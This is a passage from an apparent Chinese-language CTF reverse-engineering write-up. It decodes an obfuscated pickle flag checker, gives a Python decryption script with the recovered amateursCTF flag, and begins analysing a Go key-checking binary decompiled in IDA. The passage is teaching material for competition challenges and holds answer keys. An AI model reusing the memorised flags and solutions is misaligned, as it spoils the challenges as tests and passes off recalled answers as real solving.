R    REDUCE</span><br><span class="line">  729: \x85 TUPLE1</span><br><span class="line">  730: R    REDUCE</span><br><span class="line">  731: g    GET        1</span><br><span class="line">  734: \x87 TUPLE3</span><br><span class="line">  735: R    REDUCE</span><br><span class="line">  736: \x85 TUPLE1</span><br><span class="line">  737: R    REDUCE</span><br><span class="line">  738: \x94 MEMOIZE    (as 2)</span><br><span class="line">  739: 0    POP</span><br><span class="line">  740: g    GET        0</span><br><span class="line">  743: C    SHORT_BINBYTES b&#x27;\x01\xcev\x96.6\x96\xaeF&#x27;</span><br><span class="line">  754: \x85 TUPLE1</span><br><span class="line">  755: R    REDUCE</span><br><span class="line">  756: g    GET        0</span><br><span class="line">  759: C    SHORT_BINBYTES b&#x27;\x01\x9ev\x86&#x27;</span><br><span class="line">  765: \x85 TUPLE1</span><br><span class="line">  766: R    REDUCE</span><br><span class="line">  767: \x93 STACK_GLOBAL</span><br><span class="line">  768: g    GET        0</span><br><span class="line">  771: C    SHORT_BINBYTES b&#x27;\x01\xcev\x96.6\x96\xaeF&#x27;</span><br><span class="line">  782: \x85 TUPLE1</span><br><span class="line">  783: R    REDUCE</span><br><span class="line">  784: g    GET        0</span><br><span class="line">  787: C    SHORT_BINBYTES b&#x27;\x01\x0e\x86\xb6&#x27;</span><br><span class="line">  793: \x85 TUPLE1</span><br><span class="line">  794: R    REDUCE</span><br><span class="line">  795: \x93 STACK_GLOBAL</span><br><span class="line">  796: g    GET        0</span><br><span class="line">  799: C    SHORT_BINBYTES b&#x27;\x01\xcev\x96.6\x96\xaeF&#x27;</span><br><span class="line">  810: \x85 TUPLE1</span><br><span class="line">  811: R    REDUCE</span><br><span class="line">  812: g    GET        0</span><br><span class="line">  815: C    SHORT_BINBYTES b&#x27;\x01\xfa\xfaN\xf6\x1e\xfa\xfat.v\x96&#x27;</span><br><span class="line">  829: \x85 TUPLE1</span><br><span class="line">  830: R    REDUCE</span><br><span class="line">  831: \x93 STACK_GLOBAL</span><br><span class="line">  832: (    MARK</span><br><span class="line">  833: I        INT        138</span><br><span class="line">  838: I        INT        13</span><br><span class="line">  842: I        INT        157</span><br><span class="line">  847: I        INT        66</span><br><span class="line">  851: I        INT        68</span><br><span class="line">  855: I        INT        12</span><br><span class="line">  859: I        INT        223</span><br><span class="line">  864: I        INT        147</span><br><span class="line">  869: I        INT        198</span><br><span class="line">  874: I        INT        223</span><br><span class="line">  879: I        INT        92</span><br><span class="line">  883: I        INT        172</span><br><span class="line">  888: I        INT        59</span><br><span class="line">  892: I        INT        56</span><br><span class="line">  896: I        INT        27</span><br><span class="line">  900: I        INT        117</span><br><span class="line">  905: I        INT        173</span><br><span class="line">  910: I        INT        21</span><br><span class="line">  914: I        INT        190</span><br><span class="line">  919: I        INT        210</span><br><span class="line">  924: I        INT        44</span><br><span class="line">  928: I        INT        194</span><br><span class="line">  933: I        INT        23</span><br><span class="line">  937: I        INT        169</span><br><span class="line">  942: I        INT        57</span><br><span class="line">  946: I        INT        136</span><br><span class="line">  951: I        INT        5</span><br><span class="line">  954: I        INT        120</span><br><span class="line">  959: I        INT        106</span><br><span class="line">  964: I        INT        255</span><br><span class="line">  969: I        INT        192</span><br><span class="line">  974: I        INT        98</span><br><span class="line">  978: I        INT        64</span><br><span class="line">  982: I        INT        124</span><br><span class="line">  987: I        INT        59</span><br><span class="line">  991: I        INT        18</span><br><span class="line">  995: I        INT        124</span><br><span class="line"> 1000: I        INT        97</span><br><span class="line"> 1004: I        INT        62</span><br><span class="line"> 1008: I        INT        168</span><br><span class="line"> 1013: I        INT        181</span><br><span class="line"> 1018: I        INT        61</span><br><span class="line"> 1022: I        INT        164</span><br><span class="line"> 1027: I        INT        22</span><br><span class="line"> 1031: I        INT        187</span><br><span class="line"> 1036: I        INT        251</span><br><span class="line"> 1041: I        INT        110</span><br><span class="line"> 1046: I        INT        214</span><br><span class="line"> 1051: I        INT        250</span><br><span class="line"> 1056: I        INT        218</span><br><span class="line"> 1061: I        INT        213</span><br><span class="line"> 1066: I        INT        71</span><br><span class="line"> 1070: I        INT        206</span><br><span class="line"> 1075: I        INT        159</span><br><span class="line"> 1080: I        INT        212</span><br><span class="line"> 1085: I        INT        169</span><br><span class="line"> 1090: I        INT        208</span><br><span class="line"> 1095: I        INT        21</span><br><span class="line"> 1099: I        INT        236</span><br><span class="line"> 1104: l        LIST       (MARK at 832)</span><br><span class="line"> 1105: g    GET        2</span><br><span class="line"> 1108: \x87 TUPLE3</span><br><span class="line"> 1109: R    REDUCE</span><br><span class="line"> 1110: \x85 TUPLE1</span><br><span class="line"> 1111: R    REDUCE</span><br><span class="line"> 1112: \x94 MEMOIZE    (as 3)</span><br><span class="line"> 1113: 0    POP</span><br><span class="line"> 1114: g    GET        0</span><br><span class="line"> 1117: C    SHORT_BINBYTES b&#x27;\x01\xcev\x96.6\x96\xaeF&#x27;</span><br><span class="line"> 1128: \x85 TUPLE1</span><br><span class="line"> 1129: R    REDUCE</span><br><span class="line"> 1130: g    GET        0</span><br><span class="line"> 1133: C    SHORT_BINBYTES b&#x27;\x01\xfa\xfaN\xf6\xfa\xfat.v\x96&#x27;</span><br><span class="line"> 1146: \x85 TUPLE1</span><br><span class="line"> 1147: R    REDUCE</span><br><span class="line"> 1148: \x93 STACK_GLOBAL</span><br><span class="line"> 1149: g    GET        3</span><br><span class="line"> 1152: g    GET        0</span><br><span class="line"> 1155: C    SHORT_BINBYTES b&#x27;\x01\xcev\x96.6\x96\xaeF&#x27;</span><br><span class="line"> 1166: \x85 TUPLE1</span><br><span class="line"> 1167: R    REDUCE</span><br><span class="line"> 1168: g    GET        0</span><br><span class="line"> 1171: C    SHORT_BINBYTES b&#x27;\x01\xfa\xfa\xa6v\xfa\xfat.v\x96&#x27;</span><br><span class="line"> 1184: \x85 TUPLE1</span><br><span class="line"> 1185: R    REDUCE</span><br><span class="line"> 1186: \x93 STACK_GLOBAL</span><br><span class="line"> 1187: g    GET        0</span><br><span class="line"> 1190: C    SHORT_BINBYTES b&#x27;\x01\xcev\x96.6\x96\xaeF&#x27;</span><br><span class="line"> 1201: \x85 TUPLE1</span><br><span class="line"> 1202: R    REDUCE</span><br><span class="line"> 1203: g    GET        0</span><br><span class="line"> 1206: C    SHORT_BINBYTES b&#x27;\x01v\xa66&#x27;</span><br><span class="line"> 1212: \x85 TUPLE1</span><br><span class="line"> 1213: R    REDUCE</span><br><span class="line"> 1214: \x93 STACK_GLOBAL</span><br><span class="line"> 1215: g    GET        2</span><br><span class="line"> 1218: \x85 TUPLE1</span><br><span class="line"> 1219: R    REDUCE</span><br><span class="line"> 1220: I    INT        59</span><br><span class="line"> 1224: \x86 TUPLE2</span><br><span class="line"> 1225: R    REDUCE</span><br><span class="line"> 1226: \x86 TUPLE2</span><br><span class="line"> 1227: R    REDUCE</span><br><span class="line"> 1228: \x94 MEMOIZE    (as 4)</span><br><span class="line"> 1229: 0    POP</span><br><span class="line"> 1230: g    GET        0</span><br><span class="line"> 1233: C    SHORT_BINBYTES b&#x27;\x01\xcev\x96.6\x96\xaeF&#x27;</span><br><span class="line"> 1244: \x85 TUPLE1</span><br><span class="line"> 1245: R    REDUCE</span><br><span class="line"> 1246: g    GET        0</span><br><span class="line"> 1249: C    SHORT_BINBYTES b&#x27;\x01\xfa\xfa\xb6\xa6.\x96.\xa6\xe6\xfa\xfat.\xce\x966&#x27;</span><br><span class="line"> 1268: \x85 TUPLE1</span><br><span class="line"> 1269: R    REDUCE</span><br><span class="line"> 1270: \x93 STACK_GLOBAL</span><br><span class="line"> 1271: (    MARK</span><br><span class="line"> 1272: V        UNICODE    &#x27;Looks like you got it!&#x27;</span><br><span class="line"> 1296: V        UNICODE    &#x27;Wrong&#x27;</span><br><span class="line"> 1303: l        LIST       (MARK at 1271)</span><br><span class="line"> 1304: g    GET        4</span><br><span class="line"> 1307: \x86 TUPLE2</span><br><span class="line"> 1308: R    REDUCE</span><br><span class="line"> 1309: .    STOP</span><br><span class="line">highest protocol among opcodes = 4</span><br><span class="line">None</span><br></pre></td></tr></table></figure>

<p>大量使用了一开始定义的函数 且传入的参数为编码过的字节串 通过这个函数来解码的到以下内容:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">b&#x27;\x01.\xce\x966&#x27;</span> : <span class="built_in">bytearray</span>(<span class="string">b&#x27;list\x01&#x27;</span>)</span><br><span class="line"><span class="string">b&#x27;\x01\xa6&amp;\xf6\xc6v\xa6tN.\xce&#x27;</span> : <span class="built_in">bytearray</span>(<span class="string">b&#x27;str.encode\x01&#x27;</span>)</span><br><span class="line"><span class="string">b&#x27;\x01.v\x96N\x0e&#x27;</span> : <span class="built_in">bytearray</span>(<span class="string">b&#x27;print\x01&#x27;</span>)</span><br><span class="line"><span class="string">b&#x27;\x01.\xae\x0ev\x96&#x27;</span> : <span class="built_in">bytearray</span>(<span class="string">b&#x27;input\x01&#x27;</span>)</span><br><span class="line"><span class="string">b&#x27;\x01\xb6\xf6&amp;v\x86N&#x27;</span> : <span class="built_in">bytearray</span>(<span class="string">b&#x27;random\x01&#x27;</span>)</span><br><span class="line"><span class="string">b&#x27;\x01&amp;\xa6\xa6\xce&#x27;</span> : <span class="built_in">bytearray</span>(<span class="string">b&#x27;seed\x01&#x27;</span>)</span><br><span class="line"><span class="string">b&#x27;\x01\xa66ff\xae\x16\xce&#x27;</span> : <span class="built_in">bytearray</span>(<span class="string">b&#x27;shuffle\x01&#x27;</span>)</span><br><span class="line"><span class="string">b&#x27;\x01\x0e\x86\xb6&#x27;</span> : <span class="built_in">bytearray</span>(<span class="string">b&#x27;map\x01&#x27;</span>)</span><br><span class="line"><span class="string">b&#x27;\x01\xfa\xfaN\xf6\x1e\xfa\xfat.v\x96&#x27;</span> : <span class="built_in">bytearray</span>(<span class="string">b&#x27;int.__xor__\x01&#x27;</span>)</span><br><span class="line"><span class="string">b&#x27;\x01\xce\xa6.\x9eF&amp;v\x86N&#x27;</span> : <span class="built_in">bytearray</span>(<span class="string">b&#x27;randbytes\x01&#x27;</span>)</span><br><span class="line"><span class="string">b&#x27;\x01v\xa66&#x27;</span> : <span class="built_in">bytearray</span>(<span class="string">b&#x27;len\x01&#x27;</span>)</span><br><span class="line"><span class="string">b&#x27;\x01\x9ev\x86&#x27;</span> : <span class="built_in">bytearray</span>(<span class="string">b&#x27;any\x01&#x27;</span>)</span><br><span class="line"><span class="string">b&#x27;\x01\x0e\x86\xb6&#x27;</span> : <span class="built_in">bytearray</span>(<span class="string">b&#x27;map\x01&#x27;</span>)</span><br><span class="line"><span class="string">b&#x27;\x01\xfa\xfaN\xf6\xfa\xfat.v\x96&#x27;</span> : <span class="built_in">bytearray</span>(<span class="string">b&#x27;int.__or__\x01&#x27;</span>)</span><br><span class="line"><span class="string">b&#x27;\x01\xfa\xfa\xa6v\xfa\xfat.v\x96&#x27;</span> : <span class="built_in">bytearray</span>(<span class="string">b&#x27;int.__ne__\x01&#x27;</span>)</span><br><span class="line"><span class="string">b&#x27;\x01\xfa\xfa\xb6\xa6.\x96.\xa6\xe6\xfa\xfat.\xce\x966&#x27;</span> : <span class="built_in">bytearray</span>(<span class="string">b&#x27;list.__getitem__\x01&#x27;</span>)</span><br><span class="line"><span class="string">b&#x27;\x01\xcev\x96.6\x96\xaeF&#x27;</span> : <span class="built_in">bytearray</span>(<span class="string">b&#x27;builtins\x01&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>这样整个加密的流程就很简单易懂了 以下是大致加密流程及解密过程:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encrypt</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">...</span><br><span class="line">flag = <span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">random.seed(<span class="string">&#x27;five nights as freddy&#x27;</span>)</span><br><span class="line">shuffle(flag)</span><br><span class="line">flag = <span class="built_in">list</span>(<span class="built_in">map</span>(xor, randbytes(<span class="built_in">len</span>(flag)), flag))</span><br><span class="line">table = [<span class="string">&quot;Right&quot;</span>, <span class="string">&quot;Wrong&quot;</span>]</span><br><span class="line">enc = [<span class="number">138</span>, <span class="number">13</span>, <span class="number">157</span>, <span class="number">66</span>, <span class="number">68</span>, <span class="number">12</span>, <span class="number">223</span>, <span class="number">147</span>, <span class="number">198</span>, <span class="number">223</span>, <span class="number">92</span>, <span class="number">172</span>, <span class="number">59</span>, <span class="number">56</span>, <span class="number">27</span>, <span class="number">117</span>, <span class="number">173</span>, <span class="number">21</span>, <span class="number">190</span>, <span class="number">210</span>, <span class="number">44</span>, <span class="number">194</span>, <span class="number">23</span>, <span class="number">169</span>, <span class="number">57</span>, <span class="number">136</span>, <span class="number">5</span>, <span class="number">120</span>, <span class="number">106</span>, <span class="number">255</span>, <span class="number">192</span>, <span class="number">98</span>, <span class="number">64</span>, <span class="number">124</span>, <span class="number">59</span>, <span class="number">18</span>, <span class="number">124</span>, <span class="number">97</span>, <span class="number">62</span>, <span class="number">168</span>, <span class="number">181</span>, <span class="number">61</span>, <span class="number">164</span>, <span class="number">22</span>, <span class="number">187</span>, <span class="number">251</span>, <span class="number">110</span>, <span class="number">214</span>, <span class="number">250</span>, <span class="number">218</span>, <span class="number">213</span>, <span class="number">71</span>, <span class="number">206</span>, <span class="number">159</span>, <span class="number">212</span>, <span class="number">169</span>, <span class="number">208</span>, <span class="number">21</span>, <span class="number">236</span>]</span><br><span class="line"><span class="keyword">return</span> table[<span class="built_in">any</span>(<span class="built_in">map</span>(xor, flag, enc)) || <span class="built_in">len</span>(flag) != <span class="number">59</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># decrypt</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">random.seed(<span class="string">&#x27;five nights as freddy&#x27;</span>)</span><br><span class="line"><span class="comment"># randby = list(random.randbytes(59))</span></span><br><span class="line">table = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">59</span>)]</span><br><span class="line">random.shuffle(table)</span><br><span class="line">enc = [<span class="number">138</span>, <span class="number">13</span>, <span class="number">157</span>, <span class="number">66</span>, <span class="number">68</span>, <span class="number">12</span>, <span class="number">223</span>, <span class="number">147</span>, <span class="number">198</span>, <span class="number">223</span>, <span class="number">92</span>, <span class="number">172</span>, <span class="number">59</span>, <span class="number">56</span>, <span class="number">27</span>, <span class="number">117</span>, <span class="number">173</span>, <span class="number">21</span>, <span class="number">190</span>, <span class="number">210</span>, <span class="number">44</span>, <span class="number">194</span>, <span class="number">23</span>, <span class="number">169</span>, <span class="number">57</span>, <span class="number">136</span>, <span class="number">5</span>, <span class="number">120</span>, <span class="number">106</span>, <span class="number">255</span>, <span class="number">192</span>, <span class="number">98</span>, <span class="number">64</span>, <span class="number">124</span>, <span class="number">59</span>, <span class="number">18</span>, <span class="number">124</span>, <span class="number">97</span>, <span class="number">62</span>, <span class="number">168</span>, <span class="number">181</span>, <span class="number">61</span>, <span class="number">164</span>, <span class="number">22</span>, <span class="number">187</span>, <span class="number">251</span>, <span class="number">110</span>, <span class="number">214</span>, <span class="number">250</span>, <span class="number">218</span>, <span class="number">213</span>, <span class="number">71</span>, <span class="number">206</span>, <span class="number">159</span>, <span class="number">212</span>, <span class="number">169</span>, <span class="number">208</span>, <span class="number">21</span>, <span class="number">236</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> a ^ b</span><br><span class="line"></span><br><span class="line">reslut = <span class="built_in">list</span>(<span class="built_in">map</span>(xor, enc, random.randbytes(<span class="number">59</span>)))</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">59</span>):</span><br><span class="line">    flag += (<span class="built_in">chr</span>(reslut[table.index(i)]))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># amateursCTF&#123;p1ckL3-is_not_the_goat_l4rrY_is_m0R3_\:goat:ed&#125;</span></span><br></pre></td></tr></table></figure>

<p>除了这种静态分析的做法还有一种可以动调的做法 使用<a href="https://github.com/Legoclones/pickledbg">pickledbg</a></p>
<h2 id="gogogaga-Go语言逆向-Go多线程调试"><a href="#gogogaga-Go语言逆向-Go多线程调试" class="headerlink" title="gogogaga | Go语言逆向 | Go多线程调试"></a>gogogaga | Go语言逆向 | Go多线程调试</h2><p>IDA8.3打开用于静态分析 检查函数:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// main.checkKey</span></span><br><span class="line"><span class="type">bool</span> __golang <span class="title function_">main_checkKey</span><span class="params">(<span class="built_in">string</span> key)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// r14</span></span><br><span class="line">  __int64 v2; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 j; <span class="comment">// rbx</span></span><br><span class="line">  runtime_funcval *v7; <span class="comment">// rax</span></span><br><span class="line">  __int64 v8; <span class="comment">// rcx</span></span><br><span class="line">  runtime_hchan *v9; <span class="comment">// rdx</span></span><br><span class="line">  _QWORD *v10; <span class="comment">// r11</span></span><br><span class="line">  runtime_funcval *v11; <span class="comment">// rax</span></span><br><span class="line">  __int64 v12; <span class="comment">// rcx</span></span><br><span class="line">  runtime_hchan *v13; <span class="comment">// rdx</span></span><br><span class="line">  _QWORD *v14; <span class="comment">// r11</span></span><br><span class="line">  runtime_funcval *v15; <span class="comment">// rax</span></span><br><span class="line">  __int64 v16; <span class="comment">// rcx</span></span><br><span class="line">  runtime_hchan *v17; <span class="comment">// rdx</span></span><br><span class="line">  _QWORD *v18; <span class="comment">// r11</span></span><br><span class="line">  runtime_funcval *v19; <span class="comment">// rax</span></span><br><span class="line">  __int64 v20; <span class="comment">// rcx</span></span><br><span class="line">  runtime_hchan *v21; <span class="comment">// rdx</span></span><br><span class="line">  _QWORD *v22; <span class="comment">// r11</span></span><br><span class="line">  runtime_funcval *v23; <span class="comment">// rax</span></span><br><span class="line">  __int64 v24; <span class="comment">// rcx</span></span><br><span class="line">  runtime_hchan *v25; <span class="comment">// rdx</span></span><br><span class="line">  _QWORD *v26; <span class="comment">// r11</span></span><br><span class="line">  __int64 i; <span class="comment">// rax</span></span><br><span class="line">  uint8 v28; <span class="comment">// si</span></span><br><span class="line">  uint8 v29; <span class="comment">// si</span></span><br><span class="line">  <span class="type">bool</span> elem; <span class="comment">// [rsp+1h] [rbp-31h] BYREF</span></span><br><span class="line">  __int64 v31; <span class="comment">// [rsp+2h] [rbp-30h]</span></span><br><span class="line">  uintptr v32; <span class="comment">// [rsp+Ah] [rbp-28h]</span></span><br><span class="line">  __int64 *<span class="built_in">array</span>; <span class="comment">// [rsp+12h] [rbp-20h]</span></span><br><span class="line">  runtime_hchan *c; <span class="comment">// [rsp+1Ah] [rbp-18h]</span></span><br><span class="line">  __int64 v35; <span class="comment">// [rsp+22h] [rbp-10h]</span></span><br><span class="line">  <span class="type">void</span> *retaddr; <span class="comment">// [rsp+32h] [rbp+0h] BYREF</span></span><br><span class="line">  <span class="built_in">string</span> v37; <span class="comment">// 0:rcx.8,8:rdi.8</span></span><br><span class="line">  _slice_string v38; <span class="comment">// 0:rax.8,8:rbx.8,16:rcx.8</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( &amp;retaddr &lt;= *(v1 + <span class="number">16</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    runtime_morestack_noctxt();</span><br><span class="line">    JUMPOUT(<span class="number">0x495FC5</span>LL);</span><br><span class="line">  &#125;</span><br><span class="line">  v37.str = &amp;runtime_gcbits__ptr_;</span><br><span class="line">  v37.len = <span class="number">1LL</span>;</span><br><span class="line">  v38 = strings_genSplit(key, v37, <span class="number">0LL</span>, <span class="number">-1LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v38.len != <span class="number">5</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v2 = <span class="number">0LL</span>;</span><br><span class="line">LABEL_6:</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt;= <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">array</span> = v38.<span class="built_in">array</span>;</span><br><span class="line">    c = runtime_makechan(&amp;RTYPE_chan_bool_0, <span class="number">5LL</span>);</span><br><span class="line">    v32 = <span class="built_in">array</span>[<span class="number">1</span>];</span><br><span class="line">    v35 = *<span class="built_in">array</span>;</span><br><span class="line">    v7 = runtime_newobject(&amp;stru_4A7560);</span><br><span class="line">    v7-&gt;fn = main_checkKey_func1;</span><br><span class="line">    v7[<span class="number">2</span>].fn = v32;</span><br><span class="line">    <span class="keyword">if</span> ( *&amp;runtime_writeBarrier.enabled )</span><br><span class="line">    &#123;</span><br><span class="line">      runtime_gcWriteBarrier2();</span><br><span class="line">      v8 = v35;</span><br><span class="line">      *v10 = v35;</span><br><span class="line">      v9 = c;</span><br><span class="line">      v10[<span class="number">1</span>] = c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v8 = v35;</span><br><span class="line">      v9 = c;</span><br><span class="line">    &#125;</span><br><span class="line">    v7[<span class="number">1</span>].fn = v8;</span><br><span class="line">    v7[<span class="number">3</span>].fn = v9;</span><br><span class="line">    runtime_newproc(v7);</span><br><span class="line">    v32 = <span class="built_in">array</span>[<span class="number">3</span>];</span><br><span class="line">    v35 = <span class="built_in">array</span>[<span class="number">2</span>];</span><br><span class="line">    v11 = runtime_newobject(&amp;stru_4A7600);</span><br><span class="line">    v11-&gt;fn = main_checkKey_func2;</span><br><span class="line">    v11[<span class="number">2</span>].fn = v32;</span><br><span class="line">    <span class="keyword">if</span> ( *&amp;runtime_writeBarrier.enabled )</span><br><span class="line">    &#123;</span><br><span class="line">      runtime_gcWriteBarrier2();</span><br><span class="line">      v12 = v35;</span><br><span class="line">      *v14 = v35;</span><br><span class="line">      v13 = c;</span><br><span class="line">      v14[<span class="number">1</span>] = c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v12 = v35;</span><br><span class="line">      v13 = c;</span><br><span class="line">    &#125;</span><br><span class="line">    v11[<span class="number">1</span>].fn = v12;</span><br><span class="line">    v11[<span class="number">3</span>].fn = v13;</span><br><span class="line">    runtime_newproc(v11);</span><br><span class="line">    v32 = <span class="built_in">array</span>[<span class="number">5</span>];</span><br><span class="line">    v35 = <span class="built_in">array</span>[<span class="number">4</span>];</span><br><span class="line">    v15 = runtime_newobject(&amp;stru_4A76A0);</span><br><span class="line">    v15-&gt;fn = main_checkKey_func3;</span><br><span class="line">    v15[<span class="number">2</span>].fn = v32;</span><br><span class="line">    <span class="keyword">if</span> ( *&amp;runtime_writeBarrier.enabled )</span><br><span class="line">    &#123;</span><br><span class="line">      runtime_gcWriteBarrier2();</span><br><span class="line">      v16 = v35;</span><br><span class="line">      *v18 = v35;</span><br><span class="line">      v17 = c;</span><br><span class="line">      v18[<span class="number">1</span>] = c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v16 = v35;</span><br><span class="line">      v17 = c;</span><br><span class="line">    &#125;</span><br><span class="line">    v15[<span class="number">1</span>].fn = v16;</span><br><span class="line">    v15[<span class="number">3</span>].fn = v17;</span><br><span class="line">    runtime_newproc(v15);</span><br><span class="line">    v32 = <span class="built_in">array</span>[<span class="number">7</span>];</span><br><span class="line">    v35 = <span class="built_in">array</span>[<span class="number">6</span>];</span><br><span class="line">    v19 = runtime_newobject(&amp;stru_4A7740);</span><br><span class="line">    v19-&gt;fn = main_checkKey_func4;</span><br><span class="line">    v19[<span class="number">2</span>].fn = v32;</span><br><span class="line">    <span class="keyword">if</span> ( *&amp;runtime_writeBarrier.enabled )</span><br><span class="line">    &#123;</span><br><span class="line">      runtime_gcWriteBarrier2();</span><br><span class="line">      v20 = v35;</span><br><span class="line">      *v22 = v35;</span><br><span class="line">      v21 = c;</span><br><span class="line">      v22[<span class="number">1</span>] = c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v20 = v35;</span><br><span class="line">      v21 = c;</span><br><span class="line">    &#125;</span><br><span class="line">    v19[<span class="number">1</span>].fn = v20;</span><br><span class="line">    v19[<span class="number">3</span>].fn = v21;</span><br><span class="line">    runtime_newproc(v19);</span><br><span class="line">    v32 = <span class="built_in">array</span>[<span class="number">9</span>];</span><br><span class="line">    v35 = <span class="built_in">array</span>[<span class="number">8</span>];</span><br><span class="line">    v23 = runtime_newobject(&amp;stru_4A77E0);</span><br><span class="line">    v23-&gt;fn = main_checkKey_func5;</span><br><span class="line">    v23[<span class="number">2</span>].fn = v32;</span><br><span class="line">    <span class="keyword">if</span> ( *&amp;runtime_writeBarrier.enabled )</span><br><span class="line">    &#123;</span><br><span class="line">      runtime_gcWriteBarrier2();</span><br><span class="line">      v24 = v35;</span><br><span class="line">      *v26 = v35;</span><br><span class="line">      v25 = c;</span><br><span class="line">      v26[<span class="number">1</span>] = c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v24 = v35;</span><br><span class="line">      v25 = c;</span><br><span class="line">    &#125;</span><br><span class="line">    v23[<span class="number">1</span>].fn = v24;</span><br><span class="line">    v23[<span class="number">3</span>].fn = v25;</span><br><span class="line">    runtime_newproc(v23);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt; <span class="number">5</span>; i = v31 + <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v31 = i;</span><br><span class="line">      elem = <span class="number">0</span>;</span><br><span class="line">      runtime_chanrecv1(c, &amp;elem);</span><br><span class="line">      <span class="keyword">if</span> ( !elem )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v4 = v2;</span><br><span class="line">    v5 = v2;</span><br><span class="line">    <span class="keyword">if</span> ( v38.<span class="built_in">array</span>[v5].len == <span class="number">5</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0LL</span>; ; ++j )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( j &gt;= <span class="number">5</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v2 = v4 + <span class="number">1</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( j &gt;= v38.<span class="built_in">array</span>[v5].len )</span><br><span class="line">          runtime_panicIndex();</span><br><span class="line">        v28 = v38.<span class="built_in">array</span>[v5].str[j];</span><br><span class="line">        elem = v28 &lt; <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v28 &gt;= <span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( j &gt;= v38.<span class="built_in">array</span>[v5].len )</span><br><span class="line">            runtime_panicIndex();</span><br><span class="line">          elem = v38.<span class="built_in">array</span>[v5].str[j] &gt; <span class="string">&#x27;Z&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( elem )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( j &gt;= v38.<span class="built_in">array</span>[v5].len )</span><br><span class="line">            runtime_panicIndex();</span><br><span class="line">          v29 = v38.<span class="built_in">array</span>[v5].str[j];</span><br><span class="line">          elem = v29 &lt; <span class="number">0x30</span>u;</span><br><span class="line">          <span class="keyword">if</span> ( v29 &gt;= <span class="number">0x30</span>u )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( j &gt;= v38.<span class="built_in">array</span>[v5].len )</span><br><span class="line">              runtime_panicIndex();</span><br><span class="line">            elem = v38.<span class="built_in">array</span>[v5].str[j] &gt; <span class="string">&#x27;9&#x27;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( elem )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>整体逻辑是先检测key的格式是否是<code>?????-?????-?????-?????-?????</code> 然后检测<code>?</code>的范围是否为<code>[A-Z0-9]</code> 如果满足这两个条件就启动5个线程分别检测5段key</p>
<p>线程函数1:</p>
